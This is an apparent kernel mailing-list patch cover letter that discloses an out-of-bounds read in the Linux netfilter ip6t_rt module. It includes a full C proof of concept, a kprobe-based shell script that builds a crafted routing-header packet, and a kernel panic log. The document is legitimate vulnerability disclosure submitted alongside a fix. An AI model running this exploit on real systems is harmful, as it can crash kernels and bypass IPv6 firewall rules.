Received: from mail-oo1-f46.google.com (mail-oo1-f46.google.com [209.85.161.46])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 97BAA4EE848
	for <netfilter-devel@vger.kernel.org>; Fri,  4 Sep 2026 17:34:07 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=209.85.161.46
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1788543250; cv=none; b=Iwbuxjy3fPF5O74besYn9ruzk+k3iI5L3ewdw1lt6i9oq6HIbgULoDr7GmPFegS44UPC0aF+IHNrOgGDc7b/cg/BaWnOwH8u/0gaBuBGK94LfbFku9P8dg/9NrrKX2SlvMWms7wbu8cplUxMpRf3rgiZDB5VWaw11TY5q/n961A=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1788543250; c=relaxed/simple;
	bh=l4Hamaf391wEMhlUH2h6GMQcATexMrCgs6Du6+Rz2Zo=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=E20gM5oYXytB+D7rT6xy+67u6KondJPvzmaUOd2EMrgd/U8yqO1SVGJ/EInn7f5955paPjpNfCP1n+zZJksgcksq5JLK6fAxco/yDUxOvRWIEKRLPxc20W+DYtwVirNQoekmvFIWirVp6/uIKxxsEFsz0oUd7MCUwN/ZFADpq0A=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=M+0Cau7G; arc=none smtp.client-ip=209.85.161.46
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="M+0Cau7G"
Received: by mail-oo1-f46.google.com with SMTP id 006d021491bc7-6b12942ed04so1189691eaf.1
        for <netfilter-devel@vger.kernel.org>; Fri, 04 Sep 2026 10:34:07 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1788543246; x=1789148046; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=FYH1RlUX49lR7eC3wL+trgMYwc8lQp4dVH88I+OItAI=;
        b=M+0Cau7G65YT5uH5bOVI0xqPgcnkQguNDJE+YFtKMVe19zYQILgWiEYfbD6X1ceXK0
         4vv1h6qUnQBYJ6O+GDV3A4M4d9eU5UVifEqPJAjx7N1E9IK23b+LeBXAZR74yqlSRzRU
         wwgUclKphwq/O2xi6ZJyGV/F/LkYgJKQF0ENxgfqUeSHHaAPyk8ky6wnw8wlZbxhU0MI
         rbg522ghk+ZPdIWS8xFpj5bhUnOKIVceZHIBPwYOKyUaMPAvOWvBoEgkx/tRVHQMFQDx
         zkhrQwc6knU7+qQdHzWysj70TjZKhKmpi4EFMgyJgw6txxHbTO3LLPW3J/6K2Hm13xc+
         QOsg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1788543246; x=1789148046;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=FYH1RlUX49lR7eC3wL+trgMYwc8lQp4dVH88I+OItAI=;
        b=NG8hhDYKC2su7p+KiQLGOoeZ1HXyrdqA+KMPMrkMWaJ7WXKlWrjHBthnfz7jpCoQuj
         Mi542DuLqukiq0fssLU/68N3LT4eTLcaoPNuB8YPtDZJx8WzqqN+7d2OCfFSi+i6zKsa
         ppk8CXYIfUNknpRodxKrkZI2zNCWhExNnWphMzRT921Jd/2NwND8BkGk8rzXEhYlIWo2
         fI9Wguai06IVXPhLdKQbpMlP8pqRCMan94AMS2lFHYCAS7taqQ9gYbUMNXym7QeAtwDX
         EOMs3ZVekJUAJZlFqLzhs9QcmfuDrf31fJmdn0K/sHud0cn6nZmaWWqjKfUDAsEJ5lGd
         evng==
X-Gm-Message-State: AFuF++kwkIC6IUH8eXVThkGdjezy84kbz4/PJ0TUKzlK5KCrbLV1VDnl
	Qv86rLp3GnIYUF1hTlvZeQEg0/sbeTXzuORusWME5Ge7oJjSwLdvPuE0MNOCvrBYjIFqaGN0RLP
	HGxn4aY3Q
X-Gm-Gg: AYBFou3i2P30KxDom/3Mlcae5Bd16Z93GSs/1vdiNH4E5wsD0iwKiOuquyBTw6eyv/l
	ydEpVjhvMrWsAeUVXhNskmsVmjMxEPX8XtQBBXlheF0NSYF17a/GNq/PUfEwTZjWz61qarswLjt
	7cJim/CwpawJqUkWR64uFstuiO6Btl1hWk7BXsK5uMG++Kgi+kTVV+K+eg0tnuHCbKSEbBf9imf
	0auGQ+FUEuaKi0ythdgnzPssrrvDQzUXAO14Bh5PAihKQAFZyCmrOThPM63NrCxA9kA+P2PW+9C
	p438keBcoPBPyw750/wzXYGz5r+YYxyDVbs9KLwY+BPHdv6RGQ2/YFHFI0VFyK6vzfqbU+8U997
	uHIgut5YrqJBQk7Ygt1hS2+fDv7Fi994+BrwXgaUORyXcNiB0dJ7oyyl3zayLIoh/33T+Lsnu6X
	VnRBnLic7Mc0D6uB94JVQeSaMi4JmHz1yV3RyHWXT4azp9X0Tx9aA4yyeKFQeyGnTsioPfMQ==
X-Received: by 2002:a05:6820:2d08:b0:6b1:a812:9871 with SMTP id 006d021491bc7-6b6fbbdb3cbmr5971254eaf.18.1788543245572;
        Fri, 04 Sep 2026 10:34:05 -0700 (PDT)
Received: from enjou-Legion-Y7000P-2019 ([165.232.167.5])
        by smtp.gmail.com with ESMTPSA id a92af1059eb24-1432435648esm9761830c88.5.2026.09.04.10.34.00
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Fri, 04 Sep 2026 10:34:05 -0700 (PDT)
From: Ren Wei <weir@nebusec.ai>
To: netfilter-devel@vger.kernel.org
Cc: pablo@netfilter.org,
	fw@strlen.de,
	phil@nwl.cc,
	vega@nebusec.ai,
	rakukuip@gmail.com,
	weir@nebusec.ai
Subject: [PATCH nf 0/1] netfilter: ip6t_rt: fix zero-address non-strict match out-of-bounds read
Date: Sat,  5 Sep 2026 01:33:52 +0800
Message-ID: <cover.1788337633.git.rakukuip@gmail.com>
X-Mailer: git-send-email 2.53.0
Precedence: bulk
X-Mailing-List: netfilter-devel@vger.kernel.org
List-Id: <netfilter-devel.vger.kernel.org>
List-Subscribe: <mailto:netfilter-devel+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netfilter-devel+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

From: Luxiao Xu <rakukuip@gmail.com>

Hi Linux kernel maintainers,

We found and validated an issue in net/ipv6/netfilter/ip6t_rt.c. The bug is reachable by an unprivileged user via user and network namespaces (requiring CAP_NET_ADMIN in the local namespace).
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

In net/ipv6/netfilter/ip6t_rt.c, rt_mt6_check() permits rules to be configured with rtinfo->addrnr == 0.
When evaluating IPv6 packets with IP6T_RT_FST_NSTRICT (non-strict routing match), rt_mt6() iterates over the packet's routing addresses and compares each candidate address with rtinfo->addrs[i] before checking whether i has reached addrnr:

    if (ipv6_addr_equal(ap, &rtinfo->addrs[i])) {
        i++;
    }
    if (i == rtinfo->addrnr)
        break;

When addrnr is 0, if the first packet routing address matches rtinfo->addrs[0], i is incremented to 1. Because i is now strictly greater than addrnr (0), the loop termination condition (i == rtinfo->addrnr) will never be satisfied.

If a crafted IPv6 packet contains consecutive matching routing addresses, i will advance past IP6T_RT_HOPS (16). The subsequent call to ipv6_addr_equal() reads 16 bytes from rtinfo->addrs[16], which extends beyond struct ip6t_rt into the adjacent xtables object. This results in an out-of-bounds memory read, triggering UBSAN out-of-bounds warnings or kernel panics.

Additionally, this logic flaw causes rt_mt6() to return false when the first address matches, allowing packets to bypass firewall rules intended to match an empty non-strict sequence.

Reproducer:

    make
    ./poc.sh

    (or manually: unshare -Urn ./poc)

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------

#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/in6.h>
#include <linux/netfilter/x_tables.h>
#include <linux/netfilter_ipv6/ip6_tables.h>
#include <linux/netfilter_ipv6/ip6t_rt.h>
#include <linux/ipv6.h>
#include <netinet/in.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>

#define TABLE_NAME "raw"
#define PROBE_ADDR "::1"
#define RULE_ADDR_COUNT 16
#define TRIGGER_ADDR_COUNT 17

struct table_blob {
	struct ip6t_getinfo info;
	struct ip6t_get_entries *entries;
	socklen_t entries_len;
};

static void die_perror(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void die_msg(const char *what)
{
	fprintf(stderr, "%s\n", what);
	exit(EXIT_FAILURE);
}

static int open_ctl_socket(void)
{
	int fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);

	if (fd < 0)
		die_perror("socket(AF_INET6, SOCK_RAW, IPPROTO_RAW)");
	return fd;
}

static void run_cmd(const char *cmd)
{
	int ret = system(cmd);

	if (ret != 0) {
		fprintf(stderr, "command failed (%d): %s\n", ret, cmd);
		exit(EXIT_FAILURE);
	}
}

static struct table_blob fetch_table(int fd)
{
	struct table_blob blob;
	socklen_t len = sizeof(blob.info);

	memset(&blob, 0, sizeof(blob));
	strncpy(blob.info.name, TABLE_NAME, sizeof(blob.info.name) - 1);

	if (getsockopt(fd, IPPROTO_IPV6, IP6T_SO_GET_INFO, &blob.info, &len) < 0)
		die_perror("getsockopt(IP6T_SO_GET_INFO)");

	blob.entries_len = sizeof(*blob.entries) + blob.info.size;
	blob.entries = calloc(1, blob.entries_len);
	if (!blob.entries)
		die_perror("calloc(entries)");

	strncpy(blob.entries->name, TABLE_NAME, sizeof(blob.entries->name) - 1);
	blob.entries->size = blob.info.size;
	len = blob.entries_len;
	if (getsockopt(fd, IPPROTO_IPV6, IP6T_SO_GET_ENTRIES, blob.entries, &len) < 0)
		die_perror("getsockopt(IP6T_SO_GET_ENTRIES)");

	return blob;
}

static void free_table(struct table_blob *blob)
{
	free(blob->entries);
	memset(blob, 0, sizeof(*blob));
}

static struct ip6t_entry *find_rt_rule(struct table_blob *blob,
				       struct xt_entry_match **match_out)
{
	unsigned int off;

	for (off = 0; off < blob->info.size; ) {
		struct ip6t_entry *entry = (void *)blob->entries->entrytable + off;
		unsigned int i;

		for (i = sizeof(*entry); i < entry->target_offset; ) {
			struct xt_entry_match *match = (void *)entry + i;

			if (strcmp(match->u.user.name, "rt") == 0) {
				if (match_out)
					*match_out = match;
				return entry;
			}
			i += match->u.match_size;
		}
		off += entry->next_offset;
	}
	return NULL;
}

static uint64_t current_rule_packets(int fd, uint8_t *addrnr_out)
{
	struct table_blob blob = fetch_table(fd);
	struct xt_entry_match *match = NULL;
	struct ip6t_entry *entry = find_rt_rule(&blob, &match);
	struct ip6t_rt *rtinfo;
	uint64_t packets;

	if (!entry || !match)
		die_msg("rt rule not found in table");

	rtinfo = (struct ip6t_rt *)match->data;
	if (addrnr_out)
		*addrnr_out = rtinfo->addrnr;
	packets = (uint64_t)entry->counters.pcnt;
	free_table(&blob);
	return packets;
}

static void show_rule_state(int fd)
{
	struct table_blob blob = fetch_table(fd);
	struct xt_entry_match *match = NULL;
	struct ip6t_entry *entry = find_rt_rule(&blob, &match);
	struct ip6t_rt *rtinfo;

	if (!entry || !match)
		die_msg("rt rule not found in table");

	rtinfo = (struct ip6t_rt *)match->data;
	printf("table=%s size=%u num_entries=%u rule_packets=%llu match_size=%u addrnr=%u flags=0x%02x invflags=0x%02x\n",
	       TABLE_NAME, blob.info.size, blob.info.num_entries,
	       (unsigned long long)entry->counters.pcnt, match->u.match_size,
	       rtinfo->addrnr, rtinfo->flags, rtinfo->invflags);
	free_table(&blob);
}

static char *build_addr_list(void)
{
	char *buf;
	size_t len = RULE_ADDR_COUNT * (strlen(PROBE_ADDR) + 1);
	unsigned int i;

	buf = calloc(1, len + 1);
	if (!buf)
		die_perror("calloc(addr list)");

	for (i = 0; i < RULE_ADDR_COUNT; i++) {
		strcat(buf, PROBE_ADDR);
		if (i + 1 != RULE_ADDR_COUNT)
			strcat(buf, ",");
	}

	return buf;
}

static void install_base_rule(void)
{
	char *addr_list = build_addr_list();
	char cmd[1024];

	run_cmd("/usr/sbin/ip link set lo up");
	run_cmd("/usr/sbin/ip6tables-legacy -t raw -F");
	snprintf(cmd, sizeof(cmd),
		 "/usr/sbin/ip6tables-legacy -t raw -A OUTPUT -m rt --rt-type 0 "
		 "--rt-0-addrs '%s' --rt-0-not-strict -j ACCEPT",
		 addr_list);
	run_cmd(cmd);
	free(addr_list);
}

static void mutate_rule(int fd)
{
	struct table_blob blob = fetch_table(fd);
	struct xt_entry_match *match = NULL;
	struct ip6t_entry *entry = find_rt_rule(&blob, &match);
	struct ip6t_rt *rtinfo;
	size_t repl_len;
	struct ip6t_replace *repl;
	struct xt_counters *counters;
	struct table_blob after;
	struct xt_entry_match *after_match = NULL;
	struct ip6t_entry *after_entry;
	struct ip6t_rt *after_rtinfo;

	if (!entry || !match)
		die_msg("rt rule not found before mutation");

	rtinfo = (struct ip6t_rt *)match->data;
	printf("[*] before replace: flags=0x%02x invflags=0x%02x addrnr=%u match_size=%u packets=%llu\n",
	       rtinfo->flags, rtinfo->invflags, rtinfo->addrnr,
	       match->u.match_size, (unsigned long long)entry->counters.pcnt);

	rtinfo->addrnr = 0;

	repl_len = sizeof(*repl) + blob.info.size;
	repl = calloc(1, repl_len);
	counters = calloc(blob.info.num_entries, sizeof(*counters));
	if (!repl || !counters)
		die_perror("calloc(replace)");

	strncpy(repl->name, TABLE_NAME, sizeof(repl->name) - 1);
	repl->valid_hooks = blob.info.valid_hooks;
	repl->num_entries = blob.info.num_entries;
	repl->size = blob.info.size;
	memcpy(repl->hook_entry, blob.info.hook_entry, sizeof(repl->hook_entry));
	memcpy(repl->underflow, blob.info.underflow, sizeof(repl->underflow));
	repl->num_counters = blob.info.num_entries;
	repl->counters = counters;
	memcpy(repl->entries, blob.entries->entrytable, blob.info.size);

	if (setsockopt(fd, IPPROTO_IPV6, IP6T_SO_SET_REPLACE, repl, repl_len) < 0)
		die_perror("setsockopt(IP6T_SO_SET_REPLACE)");

	after = fetch_table(fd);
	after_entry = find_rt_rule(&after, &after_match);
	if (!after_entry || !after_match)
		die_msg("rt rule missing after replace");

	after_rtinfo = (struct ip6t_rt *)after_match->data;
	printf("[*] after replace:  flags=0x%02x invflags=0x%02x addrnr=%u packets=%llu\n",
	       after_rtinfo->flags, after_rtinfo->invflags, after_rtinfo->addrnr,
	       (unsigned long long)after_entry->counters.pcnt);
	if (after_rtinfo->addrnr != 0)
		die_msg("addrnr was not mutated to zero");

	free_table(&after);
	free(counters);
	free(repl);
	free_table(&blob);
}

static void set_panic_on_warn(void)
{
	FILE *fp = fopen("/proc/sys/kernel/panic_on_warn", "w");

	if (!fp)
		return;
	fputs("1\n", fp);
	fclose(fp);
}

static void send_rthdr_packet_from_list(const struct in6_addr *addrs,
					unsigned int addr_count)
{
	struct sockaddr_in6 dst;
	struct ipv6_rt_hdr *rh;
	unsigned char *packet;
	size_t payload_len = sizeof(struct rt0_hdr) +
			     addr_count * sizeof(struct in6_addr);
	size_t packet_len = sizeof(struct ipv6hdr) + payload_len;
	uint32_t vtc_flow;
	uint16_t plen;
	int fd;
	int on = 1;
	unsigned int i;

	fd = socket(AF_INET6, SOCK_RAW, IPPROTO_RAW);
	if (fd < 0)
		die_perror("socket(sender)");

	if (setsockopt(fd, IPPROTO_IPV6, IPV6_HDRINCL, &on, sizeof(on)) < 0)
		die_perror("setsockopt(IPV6_HDRINCL)");

	packet = calloc(1, packet_len);
	if (!packet)
		die_perror("calloc(packet)");

	vtc_flow = htonl(6U << 28);
	memcpy(packet, &vtc_flow, sizeof(vtc_flow));
	plen = htons(payload_len);
	memcpy(packet + 4, &plen, sizeof(plen));
	packet[6] = IPPROTO_ROUTING;
	packet[7] = 64;
	packet[23] = 1;
	packet[39] = 1;

	rh = (struct ipv6_rt_hdr *)(packet + sizeof(struct ipv6hdr));
	rh->nexthdr = IPPROTO_NONE;
	rh->hdrlen = addr_count * 2;
	rh->type = 0;
	rh->segments_left = 0;

	for (i = 0; i < addr_count; i++) {
		memcpy(packet + sizeof(struct ipv6hdr) + sizeof(struct rt0_hdr) +
		       i * sizeof(addrs[i]),
		       &addrs[i], sizeof(addrs[i]));
	}

	memset(&dst, 0, sizeof(dst));
	dst.sin6_family = AF_INET6;
	dst.sin6_addr = in6addr_loopback;

	if (sendto(fd, packet, packet_len, 0,
		   (struct sockaddr *)&dst, sizeof(dst)) < 0)
		die_perror("sendto(raw ipv6 hdrincl)");

	free(packet);
	close(fd);
}

static void send_rthdr_packet(unsigned int addr_count)
{
	struct in6_addr *addrs;
	unsigned int i;

	addrs = calloc(addr_count, sizeof(*addrs));
	if (!addrs)
		die_perror("calloc(default addrs)");

	for (i = 0; i < addr_count; i++) {
		if (inet_pton(AF_INET6, PROBE_ADDR, &addrs[i]) != 1)
			die_msg("inet_pton(PROBE_ADDR) failed");
	}

	send_rthdr_packet_from_list(addrs, addr_count);
	free(addrs);
}

static void send_rthdr_packet_from_file(const char *path)
{
	struct stat st;
	struct in6_addr *addrs;
	FILE *fp;
	size_t count;

	if (stat(path, &st) != 0)
		die_perror("stat(address file)");
	if (st.st_size == 0 || (st.st_size % sizeof(struct in6_addr)) != 0)
		die_msg("address file length must be a non-zero multiple of 16");

	count = st.st_size / sizeof(struct in6_addr);
	addrs = calloc(count, sizeof(*addrs));
	if (!addrs)
		die_perror("calloc(file addrs)");

	fp = fopen(path, "rb");
	if (!fp)
		die_perror("fopen(address file)");
	if (fread(addrs, sizeof(*addrs), count, fp) != count)
		die_perror("fread(address file)");
	fclose(fp);

	send_rthdr_packet_from_list(addrs, count);
	free(addrs);
}

int main(int argc, char **argv)
{
	int ctl_fd;
	uint8_t addrnr;
	uint64_t before;
	uint64_t after;
	char lockfile[128];
	unsigned int send_count = TRIGGER_ADDR_COUNT;

	if (geteuid() != 0)
		die_msg("run as root or inside a user namespace with CAP_NET_ADMIN/CAP_NET_RAW");

	snprintf(lockfile, sizeof(lockfile), "/tmp/xtables.lock.%ld", (long)getpid());
	if (setenv("XTABLES_LOCKFILE", lockfile, 1) != 0)
		die_perror("setenv(XTABLES_LOCKFILE)");

	if (argc >= 2 && strcmp(argv[1], "send") == 0) {
		if (argc >= 3)
			send_count = strtoul(argv[2], NULL, 0);
		send_rthdr_packet(send_count);
		return 0;
	}

	if (argc >= 3 && strcmp(argv[1], "sendfile") == 0) {
		send_rthdr_packet_from_file(argv[2]);
		return 0;
	}

	ctl_fd = open_ctl_socket();

	if (argc >= 2 && strcmp(argv[1], "show") == 0) {
		show_rule_state(ctl_fd);
		close(ctl_fd);
		return 0;
	}

	if (argc >= 2 && strcmp(argv[1], "install") == 0) {
		install_base_rule();
		show_rule_state(ctl_fd);
		close(ctl_fd);
		return 0;
	}

	if (argc >= 2 && strcmp(argv[1], "mutate") == 0) {
		mutate_rule(ctl_fd);
		show_rule_state(ctl_fd);
		close(ctl_fd);
		return 0;
	}

	printf("[*] installing a valid IPv6 raw OUTPUT rt rule via ip6tables-legacy\n");
	install_base_rule();
	before = current_rule_packets(ctl_fd, &addrnr);
	printf("[*] probe with valid rule: addrnr=%u packets_before=%llu\n",
	       addrnr, (unsigned long long)before);
	send_rthdr_packet(TRIGGER_ADDR_COUNT);
	after = current_rule_packets(ctl_fd, &addrnr);
	printf("[*] probe result:     addrnr=%u packets_after=%llu\n",
	       addrnr, (unsigned long long)after);
	if (after != before + 1)
		die_msg("routing-header probe did not hit the valid rt rule");

	printf("[*] mutating rt addrnr from 16 to 0 through IP6T_SO_SET_REPLACE\n");
	mutate_rule(ctl_fd);
	set_panic_on_warn();

	printf("[*] triggering malformed rule with a %u-address RH0 packet\n",
	       TRIGGER_ADDR_COUNT);
	fflush(stdout);
	send_rthdr_packet(TRIGGER_ADDR_COUNT);

	printf("[-] packet sent but no crash was observed\n");
	close(ctl_fd);
	return EXIT_FAILURE;
}


------BEGIN poc.sh------

#!/bin/sh
set -eu

PATH=/usr/sbin:/usr/bin:/sbin:/bin
PROG="${PROG:-./poc}"
TRACE=/sys/kernel/debug/tracing
EVENT=rtprobe
ADDR_FILE=/tmp/rt_addrs.bin
QCOUNT=60

cleanup() {
	if [ -e "$TRACE/events/kprobes/$EVENT/enable" ]; then
		echo 0 > "$TRACE/events/kprobes/$EVENT/enable" 2>/dev/null || true
	fi
	if [ -e "$TRACE/kprobe_events" ] && grep -q "$EVENT" "$TRACE/kprobe_events" 2>/dev/null; then
		echo "-:$EVENT" > "$TRACE/kprobe_events" 2>/dev/null || true
	fi
}

trap cleanup EXIT

if [ "$(id -u)" -ne 0 ]; then
	echo "run as root" >&2
	exit 1
fi

if [ ! -x "$PROG" ]; then
	echo "helper binary not found: $PROG" >&2
	exit 1
fi

args=
i=0
while [ "$i" -lt "$QCOUNT" ]; do
	off=$((276 + i * 8))
	args="$args q$i=+$off(+8(%si)):x64"
	i=$((i + 1))
done

echo "[*] installing the legacy raw table rule and mutating addrnr to zero"
"$PROG" install >/tmp/poc_rt_setup.log 2>&1
"$PROG" mutate >>/tmp/poc_rt_setup.log 2>&1
sleep 1

echo "[*] sampling the in-kernel bytes after addrs[15] via kprobe tracing"
echo > "$TRACE/trace"
echo "p:$EVENT rt_mt6$args" > "$TRACE/kprobe_events"
echo 1 > "$TRACE/events/kprobes/$EVENT/enable"
"$PROG" send 17
sleep 1

trace_line=$(grep 'q0=0x2800000000' "$TRACE/trace" | head -n 1 || true)
if [ -z "$trace_line" ]; then
	echo "failed to capture the mutated rt rule trace line" >&2
	cat "$TRACE/trace" >&2 || true
	exit 1
fi

python3 - "$trace_line" "$ADDR_FILE" <<'PY'
import re
import struct
import sys

line = sys.argv[1]
path = sys.argv[2]
qs = {}
for idx, value in re.findall(r'q(\d+)=0x([0-9a-fA-F]+)', line):
    qs[int(idx)] = int(value, 16)

for idx in range(60):
    if idx not in qs:
        raise SystemExit(f"missing q{idx} in trace line")

blob = bytearray((b'\x00' * 15 + b'\x01') * 16)
for idx in range(0, 60, 2):
    blob += struct.pack('<Q', qs[idx])
    blob += struct.pack('<Q', qs[idx + 1])
blob += b'\x00' * 16

with open(path, 'wb') as fp:
    fp.write(blob)

print(f"generated {len(blob) // 16} routing addresses in {path}")
PY

cleanup
trap - EXIT

echo 1 > /proc/sys/kernel/panic_on_warn
echo "[*] sending the extended RH0 packet that walks rt_mt6 past the table allocation"
exec "$PROG" sendfile "$ADDR_FILE"


------END poc.sh--------


----BEGIN crash log----

[ 2153.929267][T12258] Kernel panic - not syncing: UBSAN: panic_on_warn set ...
[ 2153.930471][T12258] CPU: 1 UID: 0 PID: 12258 Comm: poc Not tainted 6.12.95 #2
[ 2153.931467][T12258] Hardware name: QEMU Ubuntu 24.04 PC v2 (i440FX + PIIX, arch_caps fix, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014
[ 2153.933097][T12258] Call Trace:
[ 2153.933566][T12258]  <TASK>
[ 2153.934003][T12258]  panic+0x533/0x610
[ 2153.934592][T12258]  ? __pfx_panic+0x10/0x10
[ 2153.935229][T12258]  ? __pfx__printk+0x10/0x10
[ 2153.935937][T12258]  check_panic_on_warn+0x61/0x80
[ 2153.936637][T12258]  __ubsan_handle_out_of_bounds+0xe7/0x100
[ 2153.937448][T12258]  rt_mt6+0xbd8/0xdc0
[ 2153.938027][T12258]  ? __pfx_rt_mt6+0x10/0x10
[ 2153.938510][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.939123][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.939725][T12258]  ? __lock_acquire+0xc96/0x3c40
[ 2153.940301][T12258]  ip6t_do_table+0x7bd/0x1d90
[ 2153.940865][T12258]  ? __pfx___lock_acquire+0x10/0x10
[ 2153.941458][T12258]  ? __pfx_ip6t_do_table+0x10/0x10
[ 2153.942022][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.942642][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.943242][T12258]  ? rcu_is_watching+0x12/0xc0
[ 2153.943770][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.944369][T12258]  ? trace_lock_acquire+0x145/0x1c0
[ 2153.944959][T12258]  nf_hook_slow+0xa9/0x1f0
[ 2153.945455][T12258]  rawv6_sendmsg+0x26fd/0x3b60
[ 2153.946020][T12258]  ? __pfx_rawv6_sendmsg+0x10/0x10
[ 2153.946590][T12258]  ? tomoyo_check_inet_address+0x3b0/0x650
[ 2153.947237][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.947855][T12258]  ? __pfx_dst_output+0x10/0x10
[ 2153.948374][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.949030][T12258]  ? aa_sk_perm+0x1d8/0x8d0
[ 2153.949524][T12258]  ? __pfx_lock_release+0x10/0x10
[ 2153.950132][T12258]  ? __sys_sendto+0x32e/0x3a0
[ 2153.950640][T12258]  __sys_sendto+0x32e/0x3a0
[ 2153.951131][T12258]  ? __pfx___sys_sendto+0x10/0x10
[ 2153.951782][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.952377][T12258]  ? __sys_setsockopt+0x144/0x1c0
[ 2153.952948][T12258]  __x64_sys_sendto+0xe0/0x1c0
[ 2153.953460][T12258]  ? do_syscall_64+0x93/0x270
[ 2153.953971][T12258]  ? srso_alias_return_thunk+0x5/0xfbef5
[ 2153.954567][T12258]  ? lockdep_hardirqs_on+0x7b/0x110
[ 2153.955122][T12258]  do_syscall_64+0xc7/0x270
[ 2153.955631][T12258]  entry_SYSCALL_64_after_hwframe+0x77/0x7f
[ 2153.956272][T12258] RIP: 0033:0x7f7b5014e687
[ 2153.956757][T12258] Code: 48 89 fa 4c 89 df e8 58 b3 00 00 8b 93 08 03 00 00 59 5e 48 83 f8 fc 74 1a 5b c3 0f 1f 84 00 00 00 00 00 48 8b 44 24 10 0f 05 <5b> c3 0f 1f 80 00 00 00 00 83 e2 39 83 fa 08 75 de e8 23 ff ff ff
[ 2153.958028][T12258] RSP: 002b:00007ffef4b78b20 EFLAGS: 00000202 ORIG_RAX: 000000000000002c
[ 2153.958533][T12258] RAX: ffffffffffffffda RBX: 00007f7b500bc740 RCX: 00007f7b5014e687
[ 2153.959028][T12258] RDX: 0000000000000320 RSI: 0000560105516950 RDI: 0000000000000003
[ 2153.959509][T12258] RBP: 000000000000002f R08: 00007ffef4b78b90 R09: 000000000000001c
[ 2153.959998][T12258] R10: 0000000000000000 R11: 0000000000000202 R12: 00000000000002f0
[ 2153.960475][T12258] R13: 000000000000f802 R14: 0000560105516950 R15: 0000000000000320
[ 2153.961000][T12258]  </TASK>
[ 2153.961498][T12258] Kernel Offset: disabled
[ 2153.961890][T12258] Rebooting in 86400 seconds..


-----END crash log-----

Best regards,
Luxiao Xu
Ren Wei

Luxiao Xu (1):
  netfilter: ip6t_rt: fix zero-address non-strict match out-of-bounds
    read

 net/ipv6/netfilter/ip6t_rt.c | 6 ++++++
 1 file changed, 6 insertions(+)

-- 
2.43.0
